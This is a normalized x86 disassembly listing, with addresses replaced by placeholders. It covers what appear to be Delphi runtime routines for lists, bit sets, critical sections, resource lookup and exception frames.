cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_418550
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_417f50
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_417f10
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_417f74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4044a8
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b1f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417fe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41acf8
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403270
retn
sub_417ff8
push ebx
call sub_405fd8
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405fd8
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_4183f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov ebx eax
call sub_405fd8
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov ebx eax
call sub_405fd8
mov [ eax + 0xc ] ebx
sub_418050
push ebx
push esi
push edi
call sub_405fd8
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418550
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_418080
push ebx
push esi
call sub_405fd8
mov eax [ eax + 0x8 ]
call sub_403270
call sub_405fd8
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_418638
mov esi eax
call sub_405fd8
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_418440
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405fd8
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403270
sub_4180dc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_418172
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418179
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4031fc
call sub_4180dc
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031c0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40424c
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405288
call sub_4052d8
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_417f74
or bl al
sub_418184
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418232
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_418213
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4031b8
call sub_4180dc
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_417ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41821a
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_418050
retn
call sub_418080
sub_418248
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b3cc
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_4182a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41e550
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182ac
mov eax [ ebp - 0x4 ]
call sub_403270
retn
sub_4182b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_4031b8
push eax
mov eax esi
call sub_4031b8
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_4192c0
push eax
mov eax esi
call sub_4192c0
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4183c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418248
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4183a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418248
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407e6c
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183ab
mov eax [ ebp - 0xc ]
call sub_403270
retn
mov al 0x1
sub_4183d4
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4183f4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418440
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4184dc
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028f0
mov edx esi
mov eax ebx
call sub_418550
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4184a4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4184a0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
jmp sub_403a24
sub_4184dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_418524
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405d6c
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4184a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41852b
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_418550
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4184dc
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_418578
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_41870c
retn
sub_4185ac
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_4185cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4184dc
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028f0
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418644
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4184dc
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_418550
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_418440
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4185cc
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_41869c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4184dc
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4186ec
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4185ac
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418440
sub_41870c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4184dc
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_402734
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_418748
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4184dc
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_41870c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402c84
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_418440
dec ebp
inc edi
jne r-xdata
sub_4187bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403240
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_418810
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403624
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418914
xor eax eax
push ebp
push sub_418872
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403270
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403260
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418879
mov eax [ ebp - 0x4 ]
call sub_418978
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_41888c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418914
xor eax eax
push ebp
push sub_418908
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4183f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4185ac
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41890f
mov eax [ ebp - 0x4 ]
call sub_418978
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_4184dc
sub_418928
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418914
xor eax eax
push ebp
push sub_41896b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4186ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418972
mov eax [ ebp - 0x4 ]
call sub_418978
retn
sub_418984
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4189d8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4189d8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_4189b4
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026f4
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402c84
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_402714
mov edx edi
mov eax ebp
call sub_4189cc
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028f0
sub_418a7c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_4189b4
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_4189d8
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_418aa8
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_418b20
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_41b9e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_418b60
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418c16
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404080
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031c0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40424c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031c0
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c1d
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_418c3c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418cd1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031c0
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_40424c
mov eax ebx
mov si 0xffff
call sub_40346c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cd8
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax ebx
mov si 0xffff
call sub_40346c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40346c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404368
sub_418ce3
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034ac
mov eax ebx
mov si 0xffff
call sub_40346c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40346c
push eax
lea eax [ ebx + 0x4 ]
call sub_4058a8
mov ecx eax
mov edx r-xdata
pop eax
call sub_403324
sub_418d40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418d60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418d80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403324
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_418da8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_4058a8
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_40346c
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax edi
call sub_4058a8
mov edx eax
mov eax esi
call sub_418da8
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_4058a8
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_418e40
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_418e95
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4058a8
mov edx eax
mov eax edi
call sub_418da8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418e9c
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_418ea4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_418edc
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b20
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_418f0c
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_418f48
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031c0
mov edx esp
mov eax esi
call sub_40424c
add esp 0x100
pop esi
pop ebx
retn
sub_418f70
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419005
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4031c0
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_40424c
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_40346c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_418f30
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408da8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41900c
lea eax [ ebp - 0x14 ]
call sub_403fe8
retn
sub_419028
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_419528
mov edx ebx
mov eax esi
call sub_4194c0
sub_419058
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_418f30
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_418644
mov dl 0x1
mov eax ebx
call sub_418f0c
sub_419088
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_418e40
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4190d4
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_418e40
mov eax [ esi + 0x8 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b20
test bl bl
jle r-xdata
mov eax esi
call sub_4191ec
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_419120
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_419140
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4191be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4191ec
mov eax esi
call sub_4192c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
